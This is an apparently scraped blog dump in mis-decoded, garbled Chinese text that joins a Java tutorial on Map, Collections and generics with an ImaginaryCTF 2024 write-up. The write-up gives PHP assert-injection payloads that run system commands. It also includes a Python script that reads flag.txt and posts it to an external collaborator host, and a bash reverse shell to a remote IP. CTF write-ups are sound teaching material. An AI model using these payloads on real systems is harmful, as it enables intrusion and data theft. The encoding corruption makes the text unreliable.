LinkedHashMapï¼Œå®ƒä»¬åˆ†åˆ«æœ‰ä¸åŒçš„æ’åºå’Œæ€§èƒ½ç‰¹æ€§ å½“æœ‰ç›¸åŒçš„keyæ—¶ï¼Œå°±ç›¸å½“äºç­‰ä»·æ›¿æ¢ï¼š map.put(no1, éŸ©é¡ºå¹³);//k-vmap.put(no1, å¼ ä¸‰ä¸°);//ç­‰ä»·æ›¿æ¢ å¸¸ç”¨æ–¹æ³•æ·»åŠ å’Œä¿®æ”¹å…ƒç´ ï¼š put(K key, V value)ï¼šå°†æŒ‡å®šçš„é”®å€¼å¯¹æ·»åŠ åˆ° Map ä¸­ã€‚å¦‚æœé”®å·²å­˜åœ¨ï¼Œåˆ™æ›´æ–°å…¶å¯¹åº”çš„å€¼ã€‚ map.put(key1, value1); putAll(Map? extends K, ? extends V m)ï¼šå°†æŒ‡å®š Map ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹æ·»åŠ åˆ°å½“å‰ Map ä¸­ã€‚ åˆ é™¤å…ƒç´ ï¼š remove(Object key)ï¼šç§»é™¤æŒ‡å®šé”®çš„é”®å€¼å¯¹ï¼Œå¹¶è¿”å›å…¶å¯¹åº”çš„å€¼ã€‚ String removedValue = map.remove(key1); clear()ï¼šæ¸…ç©º Mapï¼Œç§»é™¤æ‰€æœ‰é”®å€¼å¯¹ã€‚ map.clear(); æŸ¥è¯¢å…ƒç´ ï¼š get(Object key)ï¼šè¿”å›æŒ‡å®šé”®å¯¹åº”çš„å€¼ï¼›å¦‚æœ Map ä¸­ä¸å­˜åœ¨è¯¥é”®ï¼Œåˆ™è¿”å› nullã€‚ String value = map.get(key1); containsKey(Object key)ï¼šæ£€æŸ¥ Map æ˜¯å¦åŒ…å«æŒ‡å®šçš„é”®ã€‚ boolean hasKey = map.containsKey(key1); containsValue(Object value)ï¼šæ£€æŸ¥ Map æ˜¯å¦åŒ…å«æŒ‡å®šçš„å€¼ã€‚ boolean hasValue = map.containsValue(value1); è·å– Map çš„ä¿¡æ¯ï¼š size()ï¼šè¿”å› Map ä¸­çš„é”®å€¼å¯¹æ•°é‡ã€‚ int size = map.size(); isEmpty()ï¼šåˆ¤æ–­ Map æ˜¯å¦ä¸ºç©ºã€‚ boolean isEmpty = map.isEmpty(); éå†æ–¹æ³• **keySet()**ï¼šè¿”å›æ˜ å°„ä¸­æ‰€æœ‰é”®çš„é›†åˆã€‚ **values()**ï¼šè¿”å›æ˜ å°„ä¸­æ‰€æœ‰å€¼çš„é›†åˆã€‚ **entrySet()**ï¼šè¿”å›æ˜ å°„ä¸­æ‰€æœ‰é”®å€¼å¯¹çš„é›†åˆï¼ˆMap.Entry å¯¹è±¡çš„é›†åˆï¼‰ã€‚å¯ä»¥é€šè¿‡å®ƒæ¥éå† Map çš„é”®å€¼å¯¹ ä¾‹å­å¦‚ä¸‹ï¼š import java.util.HashMap;import java.util.Map;import java.util.Set;public class New @SuppressWarnings(all) public static void main(String[] args) Map map = new HashMap(); map.put(Alice, 25); map.put(Bob, 30); map.put(Charlie, 35); // ä½¿ç”¨ keySet éå†é”® SetString keys = map.keySet(); for (String key : keys) System.out.println(key + = + map.get(key)); // ä½¿ç”¨ entrySet éå†é”®å€¼å¯¹ for (Map.EntryString, Integer entry : map.entrySet()) System.out.println(entry.getKey() + = + entry.getValue()); // ä½¿ç”¨ values éå†å€¼ CollectionInteger values = map.values(); for (Integer value : values) System.out.println(value); å¼€å‘ä¸­å¦‚ä½•é€‰æ‹©é›†åˆå®ç°ç±» Collectionså·¥å…·ç±»Collectionsæ˜¯ä¸€ä¸ªæ“ä½œSetã€Listå’ŒMapç­‰é›†åˆçš„å·¥å…·ç±» Collectionsä¸­æä¾›äº†ä¸€ç³»åˆ—é™æ€çš„æ–¹æ³•å¯¹é›†åˆå…ƒç´ è¿›è¡Œæ’åºã€æŸ¥è¯¢å’Œä¿®æ”¹ç­‰æ“ä½œ ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ Collections æ–¹æ³•ï¼š æ’åºï¼šCollections.sort(ListT list) å¯ä»¥å¯¹ List è¿›è¡Œå‡åºæ’åºã€‚ ListInteger numbers = Arrays.asList(5, 3, 9, 1);Collections.sort(numbers);System.out.println(numbers); // è¾“å‡º [1, 3, 5, 9] æŸ¥æ‰¾æœ€å¤§å€¼å’Œæœ€å°å€¼ï¼š Collections.max(CollectionT coll) æŸ¥æ‰¾é›†åˆä¸­çš„æœ€å¤§å€¼ã€‚ Collections.min(CollectionT coll) æŸ¥æ‰¾é›†åˆä¸­çš„æœ€å°å€¼ã€‚ int max = Collections.max(numbers); // è¿”å› 9int min = Collections.min(numbers); // è¿”å› 1 åè½¬ï¼šCollections.reverse(List? list) å¯ä»¥å°† List åè½¬ã€‚ Collections.reverse(numbers);System.out.println(numbers); // è¾“å‡º [9, 5, 3, 1] éšæœºæ‰“ä¹±ï¼šCollections.shuffle(List? list) å¯ä»¥å°† List éšæœºæ‰“ä¹±é¡ºåºã€‚ Collections.shuffle(numbers);System.out.println(numbers); // è¾“å‡ºæ‰“ä¹±åçš„é¡ºåº ä¸å¯ä¿®æ”¹é›†åˆï¼šCollections.unmodifiableList(List? extends T list) å¯ä»¥è¿”å›ä¸€ä¸ªä¸å¯ä¿®æ”¹çš„é›†åˆã€‚ ListInteger unmodifiableList = Collections.unmodifiableList(numbers);// è¯•å›¾ä¿®æ”¹ unmodifiableList ä¼šæŠ›å‡º UnsupportedOperationException æ³›å‹åŸºç¡€Javaä¸­çš„æ³›å‹ï¼ˆGenericsï¼‰æ˜¯Java 5å¼•å…¥çš„ä¸€é¡¹é‡è¦ç‰¹æ€§ï¼Œå…è®¸ç±»ã€æ¥å£å’Œæ–¹æ³•èƒ½å¤Ÿæ“ä½œæŒ‡å®šç±»å‹çš„å¯¹è±¡ï¼Œè€Œæ— éœ€åœ¨ç¼–å†™ä»£ç æ—¶æ˜ç¡®æŒ‡å®šç±»å‹ã€‚è¿™ç§æœºåˆ¶é€šè¿‡å°†ç±»å‹å‚æ•°åŒ–ï¼Œæä¾›äº†æ›´é«˜çš„ä»£ç å¤ç”¨æ€§å’Œç±»å‹å®‰å…¨æ€§ ä¼ ç»Ÿæ–¹æ³•é¢ä¸´çš„é—®é¢˜ ä¸èƒ½å¯¹åŠ å…¥åˆ°é›†åˆä¸­çš„æ•°æ®ç±»å‹è¿›è¡Œçº¦æŸï¼ˆæ¯”å¦‚è¦æ±‚è¾“å…¥çš„æ˜¯Dogç±»ï¼Œç»“æœä¸å°å¿ƒè¾“å…¥äº†Catç±»ï¼‰ éå†çš„æ—¶å€™ï¼Œéœ€è¦è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå½±å“æ•ˆç‡ for (Object o : arrayList) //å‘ä¸‹è½¬å‹ Object -DogDog dog = (Dog) o;System.out.println(dog.getName() + - + dog.getAge()); å¯¹äºæ³›å‹ä¸¾ä¸ªä¾‹å­å¦‚ä¸‹ï¼š å½“æˆ‘ä»¬ ArrayListDog è¡¨ç¤ºå­˜æ”¾åˆ° ArrayList é›†åˆä¸­çš„å…ƒç´ æ˜¯ Dog ç±»å‹ (ç»†èŠ‚åé¢è¯´â€¦) å¦‚æœç¼–è¯‘å™¨å‘ç°æ·»åŠ çš„ç±»å‹ï¼Œä¸æ»¡è¶³è¦æ±‚ï¼Œå°±ä¼šæŠ¥é”™ åœ¨éå†çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å–å‡º Dog ç±»å‹è€Œä¸æ˜¯ Object for (Dog dog : arrayList) System.out.println(dog.getName() + - + dog.getAge()); public class ArrayListE E ç§°ä¸ºæ³›å‹,é‚£ä¹ˆ Dog-E æ³›å‹çš„ä¼˜ç‚¹ï¼š ç¼–è¯‘æ—¶æ£€æŸ¥äº†æ·»åŠ å…ƒç´ çš„ç±»å‹ï¼Œæé«˜äº†å®‰å…¨æ€§ å‡å°‘äº†ç±»å‹è½¬æ¢çš„æ¬¡æ•°ï¼Œæé«˜äº†æ•ˆç‡ ä¸ä¼šæç¤ºç¼–è¯‘è­¦å‘Š åˆ©ç”¨1. æ³›å‹ç±»å®šä¹‰ä¸€ä¸ªæ³›å‹ç±» Boxï¼Œç”¨æ¥å­˜å‚¨ä»»æ„ç±»å‹çš„å¯¹è±¡ï¼š public class BoxT private T item; public void setItem(T item) this.item = item; public T getItem() return item; ä½¿ç”¨æ³›å‹ç±»çš„ä¾‹å­ï¼š public class Main public static void main(String[] args) BoxString stringBox = new Box(); stringBox.setItem(Hello); System.out.println(String: + stringBox.getItem()); BoxInteger integerBox = new Box(); integerBox.setItem(123); System.out.println(Integer: + integerBox.getItem()); è¾“å‡ºï¼š String: HelloInteger: 123 2. æ³›å‹æ–¹æ³•å®šä¹‰ä¸€ä¸ªæ³›å‹æ–¹æ³• printArrayï¼Œå¯ä»¥æ‰“å°ä»»ä½•ç±»å‹æ•°ç»„çš„å†…å®¹ï¼š public class Main public static T void printArray(T[] inputArray) for (T element : inputArray) System.out.println(element); public static void main(String[] args) Integer[] intArray = 1, 2, 3; String[] strArray = Hello, World; printArray(intArray); // æ‰“å°æ•´å‹æ•°ç»„ printArray(strArray); // æ‰“å°å­—ç¬¦ä¸²æ•°ç»„ è¾“å‡ºï¼š 123HelloWorld 3. æ³›å‹æ¥å£å®šä¹‰ä¸€ä¸ªæ³›å‹æ¥å£ Containerï¼Œç”¨æ¥å­˜å‚¨å’Œè·å–ä»»æ„ç±»å‹çš„å¯¹è±¡ï¼š public interface ContainerT void add(T item); T get();public class StringContainer implements ContainerString private String item; @Override public void add(String item) this.item = item; @Override public String get() return item; ä½¿ç”¨æ³›å‹æ¥å£çš„ä¾‹å­ï¼š public class Main public static void main(String[] args) StringContainer container = new StringContainer(); container.add(Hello Generics); System.out.println(container.get()); è¾“å‡ºï¼š Hello Generics 4. æ³›å‹é€šé…ç¬¦ä½¿ç”¨é€šé…ç¬¦ ? extends T å’Œ ? super T æ¥é™å®šç±»å‹çš„èŒƒå›´ï¼š ä¸Šé™é€šé…ç¬¦ ? extends Tè¡¨ç¤ºç±»å‹å¿…é¡»æ˜¯Tæˆ–å…¶å­ç±»ã€‚å®šä¹‰ä¸€ä¸ªæ–¹æ³•æ‰“å°æ‰€æœ‰ç±»å‹ä¸ºNumberåŠå…¶å­ç±»çš„åˆ—è¡¨ã€‚ import java.util.List;public class Main public static void printNumbers(List? extends Number numbers) for (Number number : numbers) System.out.println(number); public static void main(String[] args) ListInteger intList = List.of(1, 2, 3); ListDouble doubleList = List.of(1.1, 2.2, 3.3); printNumbers(intList); // æ‰“å°æ•´å‹åˆ—è¡¨ printNumbers(doubleList); // æ‰“å°åŒç²¾åº¦åˆ—è¡¨ è¾“å‡ºï¼š 1231.12.23.3 ä¸‹é™é€šé…ç¬¦ ? super Tè¡¨ç¤ºç±»å‹å¿…é¡»æ˜¯Tæˆ–å…¶çˆ¶ç±»ã€‚å®šä¹‰ä¸€ä¸ªæ–¹æ³•å°†å…ƒç´ æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œåˆ—è¡¨å¯ä»¥æ˜¯Integeræˆ–å…¶çˆ¶ç±»çš„ç±»å‹ã€‚ import java.util.List;import java.util.ArrayList;public class Main public static void addNumbers(List? super Integer list) list.add(1); list.add(2); list.add(3); public static void main(String[] args) ListNumber numberList = new ArrayList(); addNumbers(numberList); for (Object num : numberList) System.out.println(num); è¾“å‡ºï¼š 123 æ€»ç»“ æ³›å‹ç±»ï¼šå¯ä»¥è®©ç±»å­˜å‚¨å’Œæ“ä½œå¤šç§ä¸åŒç±»å‹çš„æ•°æ®ã€‚ æ³›å‹æ–¹æ³•ï¼šå…è®¸æ–¹æ³•é€‚åº”å¤šç§ç±»å‹ã€‚ æ³›å‹æ¥å£ï¼šä½¿æ¥å£å¯ä»¥ä¸ä¸åŒç±»å‹çš„å®ç°ç±»è¿›è¡Œäº¤äº’ã€‚ é€šé…ç¬¦ï¼šæä¾›äº†æ›´çµæ´»çš„ç±»å‹é™å®šã€‚ å¸¸è§æ³›å‹ç¬¦å·ï¼š Tï¼šTypeï¼Œè¡¨ç¤ºç±»å‹ã€‚ Eï¼šElementï¼Œå¸¸ç”¨äºé›†åˆç±»ä¸­ã€‚ Kï¼šKeyï¼Œå¸¸ç”¨äºé”®å€¼å¯¹ã€‚ Vï¼šValueï¼Œå¸¸ç”¨äºé”®å€¼å¯¹ã€‚ æ³¨æ„äº‹é¡¹ï¼š Tã€Eåªèƒ½æ˜¯å¼•ç”¨ç±»å‹ åœ¨ç»™æ³›å‹æŒ‡å®šå…·ä½“ç±»å‹åï¼Œå¯ä»¥ä¼ å…¥è¯¥ç±»å‹æˆ–è€…å…¶å­ç±»ç±»å‹ å½“å†™List list3 = new ArrayList();ï¼Œé»˜è®¤å®ƒçš„æ³›å‹ä¸ºEï¼Œä¹Ÿå°±æ˜¯Object è‡ªå®šä¹‰æ³›å‹è‡ªå®šä¹‰æ³›å‹ç±»åŸºæœ¬è¯­æ³• class ç±»å T,R...//...è¡¨ç¤ºå¯ä»¥æœ‰å¤šä¸ªæ³›å‹\tæˆå‘˜ æ³¨æ„äº‹é¡¹ï¼š æ™®é€šæˆå‘˜å¯ä»¥ä½¿ç”¨æ³›å‹ ä½¿ç”¨æ³›å‹çš„æ•°ç»„ï¼Œä¸èƒ½åˆå§‹åŒ– é™æ€æ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨ç±»çš„æ³›å‹ æ³›å‹ç±»çš„ç±»å‹ï¼Œæ˜¯åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ç¡®å®šçš„ï¼ˆå› ä¸ºåˆ›å»ºå¯¹è±¡æ—¶ï¼Œéœ€è¦æŒ‡å®šç±»å‹ï¼‰ å¦‚æœåœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šç±»å‹ï¼Œé»˜è®¤ä¸ºObject ä¸‹é¢ä¸¾ä¸ªç›¸å…³çš„ä¾‹å­ï¼š import java.util.Arrays;@SuppressWarnings(all)public class New public static void main(String[] args) //T=Double, R=String, M=Integer TigerDouble,String,Integer g = new Tiger(john); g.setT(10.9); //OK//g.setT(yy); //é”™è¯¯ï¼Œç±»å‹ä¸å¯¹ System.out.println(g); Tiger g2 = new Tiger(john~~);//OK T=Object R=Object M=Object g2.setT(yy); //OK ,å› ä¸º T=Object yy=String æ˜¯ Object å­ç±» System.out.println(g2= + g2); //1. Tiger åé¢æ³›å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ Tiger å°±ç§°ä¸ºè‡ªå®šä¹‰æ³›å‹ç±»//2, T, R, M æ³›å‹çš„æ ‡è¯†ç¬¦, ä¸€èˆ¬æ˜¯å•ä¸ªå¤§å†™å­—æ¯//3. æ³›å‹æ ‡è¯†ç¬¦å¯ä»¥æœ‰å¤šä¸ª. //4. æ™®é€šæˆå‘˜å¯ä»¥ä½¿ç”¨æ³›å‹ (å±æ€§ã€æ–¹æ³•)//5. ä½¿ç”¨æ³›å‹çš„æ•°ç»„ï¼Œä¸èƒ½åˆå§‹åŒ–//6. é™æ€æ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨ç±»çš„æ³›å‹class TigerT, R, M String name; R r; //å±æ€§ä½¿ç”¨åˆ°æ³›å‹ M m; T t; //å› ä¸ºæ•°ç»„åœ¨ new ä¸èƒ½ç¡®å®š T çš„ç±»å‹ï¼Œå°±æ— æ³•åœ¨å†…å­˜å¼€ç©ºé—´ T[] ts; public Tiger(String name) this.name = name; public Tiger(R r, M m, T t) //æ„é€ å™¨ä½¿ç”¨æ³›å‹ this.r = r; this.m = m; this.t = t; public Tiger(String name, R r, M m, T t) //æ„é€ å™¨ä½¿ç”¨æ³›å‹ this.name = name; this.r = r; this.m = m; this.t = t; //å› ä¸ºé™æ€æ˜¯å’Œç±»ç›¸å…³çš„ï¼Œåœ¨ç±»åŠ è½½æ—¶ï¼Œå¯¹è±¡è¿˜æ²¡æœ‰åˆ›å»º//æ‰€ä»¥ï¼Œå¦‚æœé™æ€æ–¹æ³•å’Œé™æ€å±æ€§ä½¿ç”¨äº†æ³›å‹ï¼ŒJVM å°±æ— æ³•å®Œæˆåˆå§‹åŒ–// static R r2;// public static void m1(M m) //// //æ–¹æ³•ä½¿ç”¨æ³›å‹public String getName() return name; public void setName(String name) this.name = name; public R getR() return r; public void setR(R r) //æ–¹æ³•ä½¿ç”¨åˆ°æ³›å‹ this.r = r; public M getM() //è¿”å›ç±»å‹å¯ä»¥ä½¿ç”¨æ³›å‹. return m; return m; public void setM(M m) this.m = m; public T getT() return t; public void setT(T t) this.t = t; @Override public String toString() return Tiger + name= + name + \\ + , r= + r + , m= + m + , t= + t + , ts= + Arrays.toString(ts) + ; è‡ªå®šä¹‰æ³›å‹æ¥å£åŸºæœ¬è¯­æ³•ï¼š interface æ¥å£åT,R æ³¨æ„äº‹é¡¹ï¼š æ¥å£ä¸­ï¼Œé™æ€æˆå‘˜ä¸èƒ½ä½¿ç”¨æ³›å‹ æ³›å‹æ¥å£çš„ç±»å‹ï¼Œåœ¨ç»§æ‰¿æ¥å£æˆ–è€…å®ç°æ¥å£çš„æ—¶å€™ç¡®å®š æ²¡æœ‰æŒ‡å®šç±»å‹ï¼Œé»˜è®¤ä¸ºObject ä¸¾ä¾‹å¦‚ä¸‹ï¼š //åœ¨ç»§æ‰¿æ¥å£ æŒ‡å®šæ³›å‹æ¥å£çš„ç±»å‹interface IA extends IUsbString, Double //å½“æˆ‘ä»¬å»å®ç° IA æ¥å£æ—¶ï¼Œå› ä¸º IA åœ¨ç»§æ‰¿ IUsu æ¥å£æ—¶ï¼ŒæŒ‡å®šäº† U ä¸º String R ä¸º Double//ï¼Œåœ¨å®ç° IUsu æ¥å£çš„æ–¹æ³•æ—¶ï¼Œä½¿ç”¨ String æ›¿æ¢ U, æ˜¯ Double æ›¿æ¢ Rclass AA implements IA @Override public Double get(String s) return null; @Override public void hi(Double aDouble) @Override public void run(Double r1, Double r2, String u1, String u2) //å®ç°æ¥å£æ—¶ï¼Œç›´æ¥æŒ‡å®šæ³›å‹æ¥å£çš„ç±»å‹//ç»™ U æŒ‡å®š Integer ç»™ R æŒ‡å®šäº† Float//æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å®ç° IUsb æ–¹æ³•æ—¶ï¼Œä¼šä½¿ç”¨ Integer æ›¿æ¢ U, ä½¿ç”¨ Float æ›¿æ¢ Rclass BB implements IUsbInteger, Float @Override public Float get(Integer integer) return null; @Override public void hi(Float aFloat) @Override public void run(Float r1, Float r2, Integer u1, Integer u2) //æ²¡æœ‰æŒ‡å®šç±»å‹ï¼Œé»˜è®¤ä¸º Object//å»ºè®®ç›´æ¥å†™æˆ IUsbObject,Objectclass CC implements IUsb //ç­‰ä»· class CC implements IUsbObject,Object @Override public Object get(Object o) return null; @Override public void hi(Object o) @Override public void run(Object r1, Object r2, Object u1, Object u2) interface IUsbU, R int n = 10;//U name; ä¸èƒ½è¿™æ ·ä½¿ç”¨//æ™®é€šæ–¹æ³•ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ¥å£æ³›å‹\tR get(U u); void hi(R r); void run(R r1, R r2, U u1, U u2); //åœ¨ jdk8 ä¸­ï¼Œå¯ä»¥åœ¨æ¥å£ä¸­ï¼Œä½¿ç”¨é»˜è®¤æ–¹æ³•, ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨æ³›å‹ default R method(U u) return null; è‡ªå®šä¹‰æ³›å‹æ–¹æ³•åŸºæœ¬è¯­æ³•ï¼š ä¿®é¥°ç¬¦ T,Rè¿”å›ç±»å‹ æ–¹æ³•å(å‚æ•°åˆ—è¡¨) æ³¨æ„äº‹é¡¹ï¼š æ³›å‹æ–¹æ³•å¯ä»¥å®šä¹‰åœ¨æ™®é€šç±»ä¸­ï¼Œä¹Ÿå¯ä»¥å®šä¹‰åœ¨æ³›å‹ç±»ä¸­ å½“æ³›å‹æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œç±»å‹å°±ä¼šç¡®å®š public void eat(E e){}ï¼Œä¿®é¥°ç¬¦åæ²¡æœ‰T,Râ€¦eatæ–¹æ³•ä¸æ˜¯æ³›å‹æ–¹æ³•ï¼Œè€Œæ˜¯ä½¿ç”¨äº†æ³›å‹ ä¸¾ä¸ªä¾‹å­å¦‚ä¸‹ import java.util.ArrayList;@SuppressWarnings(all)public class New public static void main(String[] args) Car car = new Car(); car.fly(å®é©¬, 100);//å½“è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼ å…¥å‚æ•°ï¼Œç¼–è¯‘å™¨ï¼Œå°±ä¼šç¡®å®šç±»å‹ System.out.println(=======); car.fly(300, 100.1);//å½“è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼ å…¥å‚æ•°ï¼Œç¼–è¯‘å™¨ï¼Œå°±ä¼šç¡®å®šç±»å‹//æµ‹è¯•//T-String, R- ArrayList FishString, ArrayList fish = new Fish(); fish.hello(new ArrayList(), 11.3f); //æ³›å‹æ–¹æ³•ï¼Œå¯ä»¥å®šä¹‰åœ¨æ™®é€šç±»ä¸­, ä¹Ÿå¯ä»¥å®šä¹‰åœ¨æ³›å‹ç±»ä¸­class Car //æ™®é€šç±» public void run() //æ™®é€šæ–¹æ³• //è¯´æ˜ æ³›å‹æ–¹æ³•//1. T,R å°±æ˜¯æ³›å‹//2. æ˜¯æä¾›ç»™ fly ä½¿ç”¨çš„ public T, R void fly(T t, R r) //æ³›å‹æ–¹æ³• System.out.println(t.getClass());//String System.out.println(r.getClass());//Integer class FishT, R //æ³›å‹ç±» public void run() //æ™®é€šæ–¹æ³• public U, M void eat(U u, M m) //æ³›å‹æ–¹æ³• //è¯´æ˜//1. ä¸‹é¢ hi æ–¹æ³•ä¸æ˜¯æ³›å‹æ–¹æ³•//2. æ˜¯ hi æ–¹æ³•ä½¿ç”¨äº†ç±»å£°æ˜çš„ æ³›å‹ public void hi(T t) //æ³›å‹æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç±»å£°æ˜çš„æ³›å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±å£°æ˜æ³›å‹ public K void hello(R r, K k) System.out.println(r.getClass());//ArrayList System.out.println(k.getClass());//Float","categories":["å¼€å‘"]},{"title":"imaginaryctf-writeup","path":"/2024/07/25/imaginaryctf-writeup/","content":"journalå…³æ³¨é‡ç‚¹ä»£ç  ?phpecho pWelcome to my journal app!/p;echo pa href=/?file=file1.txtfile1.txt/a/p;echo pa href=/?file=file2.txtfile2.txt/a/p;echo pa href=/?file=file3.txtfile3.txt/a/p;echo pa href=/?file=file4.txtfile4.txt/a/p;echo pa href=/?file=file5.txtfile5.txt/a/p;echo p;if (isset($_GET[file])) $file = $_GET[file]; $filepath = ./files/ . $file; assert(strpos($file, ..) === false) or die(Invalid file!); if (file_exists($filepath)) include($filepath); else echo File not found!; echo /p; é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°æˆ‘ä»¬éœ€è¦getä¼ å‚fileï¼Œç„¶åä¸‹é¢ç¦æ‰äº†..ä»¥é¿å…ç›®å½•ç©¿è¶Šï¼Œç„¶åå½“assertçš„ç»“æœä¸ºfalseçš„æ—¶å€™ä¼šæ‰§è¡Œåé¢çš„ä»£ç å¹¶ç»“æŸè¿›ç¨‹ ç»è¿‡äº†ä¸€æ®µæ—¶é—´çš„å°è¯•åæˆ‘ä»¬å¯¹äºIncludeå‡½æ•°åšä¸äº†æ–‡ç« ï¼Œæ‰€ä»¥å…³é”®ç‚¹å°±åœ¨äºassertå‡½æ•°å¤„ è¿™æ—¶å€™ä¸Šç½‘æœç´¢äº†ä¸€ä¸‹ï¼Œphp7.9ï¼Œassertï¼Œæ¼æ´ï¼Œç»™æˆ‘æ¨äº†ä¸€ç¯‡æ–‡ç« ï¼Œè®©æˆ‘æ˜ç™½äº†æˆ‘ä»¬å¯ä»¥å°è¯•é€ƒè„±å•å¼•å·åŒ…æ‹¬ æ‰€ä»¥payloadä¸ºï¼š?file=file1.txt and die(system(ls /)) orï¼Œç”±äºæ˜¯andï¼Œæ‰€ä»¥ä¼šæ¥ç€æ‰§è¡Œdieä¸­çš„è¯­å¥ å¾—åˆ°äº†å…·ä½“çš„æ–‡ä»¶åï¼Œæˆ‘ä»¬åªéœ€è¦catä¸€ä¸‹flagå°±å‡ºæ¥å•¦ å…¶å®æ­£è§£åº”è¯¥æ˜¯é—­åˆstrposå‡½æ•°ï¼Œç„¶åæ„é€ å±äºæˆ‘ä»¬è‡ªå·±çš„è¯­å¥ æ‰€ä»¥payloadä¸ºï¼š?file=zz,..)==false%26%26system(ls /);//ï¼Œç”±äºæ˜¯getä¼ å‚ï¼Œæ‰€ä»¥è¦ç¼–ç  readmeè¿™é“é¢˜ä½ åªéœ€è¦çœ‹dockerfileæ–‡ä»¶å°±å¥½äº†ï¼Œflagå°±åœ¨é‡Œé¢ P2Cé¦–å…ˆè®¤çœŸé˜…è¯»app.pyï¼Œå…¶ä¸­çš„å‡½æ•°xecä½œç”¨æ˜¯æ¥å—ä¸€æ®µä»£ç å­—ç¬¦ä¸²ï¼Œç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„æ–‡ä»¶åå¹¶åˆ›å»ºæ–‡ä»¶ï¼Œå°†ä»£ç å†™å…¥æ–‡ä»¶ï¼Œå¹¶æ·»åŠ  main å‡½æ•°å®šä¹‰åŠè°ƒç”¨ rgb_parseï¼Œè®¾ç½®æ–‡ä»¶æƒé™ä¸º755ï¼Œä»¥ user ç”¨æˆ·èº«ä»½è¿è¡Œç”Ÿæˆçš„ Python æ–‡ä»¶ï¼Œå¹¶æ•è·è¾“å‡ºï¼Œä¹‹ååˆ é™¤ç”Ÿæˆçš„æ–‡ä»¶å¹¶è¿”å›æ‰§è¡Œç»“æœ ä¸‹é¢è·¯ç”±ä½œç”¨æ˜¯å¤„ç† GET å’Œ POST è¯·æ±‚ã€‚è¯¥è·¯ç”±çš„ä¸»è¦åŠŸèƒ½æ˜¯æ¥æ”¶ç”¨æˆ·æäº¤çš„ä¸€æ®µä»£ç ï¼Œé€šè¿‡ xec å‡½æ•°æ‰§è¡Œè¿™æ®µä»£ç ï¼Œå¹¶æ ¹æ®æ‰§è¡Œç»“æœç”Ÿæˆä¸€ä¸ª RGB é¢œè‰²å€¼ï¼Œç„¶åå°†è¿™ä¸ªé¢œè‰²å€¼ä¼ é€’ç»™ index.html æ¨¡æ¿è¿›è¡Œæ¸²æŸ“ é¢˜ç›®æœ‰æä¾›ç»™æˆ‘ä»¬dockerfileï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æœ¬åœ°èµ·ä¸ªdockerè‡ªå·±è°ƒè¯• ä¼—æ‰€å‘¨çŸ¥æˆ‘ä»¬postä¼ å‚çš„å†…å®¹ä¼šå†™è¿›ä¸€ä¸ªmain()å‡½æ•°ä¸­ï¼Œè€Œpythonä¸­æ˜¯å…è®¸å‡½æ•°å†…éƒ¨importåº“ä»¥åŠå®šä¹‰å…¶ä»–å‡½æ•°å¹¶æ‰§è¡Œ è¯¥é¢˜ä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œåªæœ‰èƒŒæ™¯é¢œè‰²çš„å˜åŒ–ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ€è€ƒè¦æ€ä¹ˆè®©æˆ‘ä»¬éœ€è¦çš„å†…å®¹å›æ˜¾ è¿™è¾¹æœ‰ä¸€ä¸ªæ€è·¯ï¼Œå°±æ˜¯å°†å†…å®¹ç»™ä¼ å‚åˆ°å¦ä¸€ä¸ªç½‘å€ä¸Šï¼Œé‚£ä¸ªç½‘å€è¦å¤„äºæˆ‘ä»¬çš„ç›‘å¬ä¸­æˆ–è€…æ˜¯ç”¨bpä¸­çš„collaboratoræ¨¡å—ç”Ÿæˆçš„ç½‘å€ è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯æˆ‘ä»¬åªèƒ½ç”¨åˆ°pythonè‡ªå¸¦çš„åº“ï¼Œæ¯”å¦‚åœ¨å‘é€è¯·æ±‚çš„æ—¶å€™å°±ä¸èƒ½ç”¨requestsåº“ ç»¼ä¸Šï¼Œæˆ‘ä»¬çš„è„šæœ¬å¦‚ä¸‹ï¼š import urllib.requestimport subprocessimport urllib.parsedef fetch_data(): # è·å– flag.txt æ–‡ä»¶å†…å®¹ result = subprocess.run([cat, flag.txt], capture_output=True, text=True) flag = result.stdout.strip() # è·å–è¾“å‡ºå¹¶å»æ‰å¤šä½™çš„ç©ºç™½å­—ç¬¦æˆ–æ¢è¡Œç¬¦ # å‡†å¤‡ POST è¯·æ±‚çš„æ•°æ® data = urllib.parse.urlencode(flag: flag).encode() # å®šä¹‰ URL url = http://98fblnzfud30168qw6nczlq34ualyhm6.oastify.com/ # å‘é€ POST è¯·æ±‚ req = urllib.request.Request(url, data=data) response = urllib.request.urlopen(req) result = response.read().decode(utf-8) return result# è·å–å¹¶æ‰“å°ç»“æœresult = fetch_data() åˆ°bpä¸­æŸ¥çœ‹ï¼Œå¾—åˆ°flag è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œåœ¨æ²¡æœ‰ä»»ä½•å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åå¼¹shell å› æ­¤æˆ‘ä»¬çš„è„šæœ¬å¦‚ä¸‹æ‰€ç¤ºï¼š import subprocesscommand = /bin/bash -i /dev/tcp/5.5.5.5/2333 01subprocess.call(command, shell=True)a=Helloreturn a åœ¨ç‚¹å‡»run 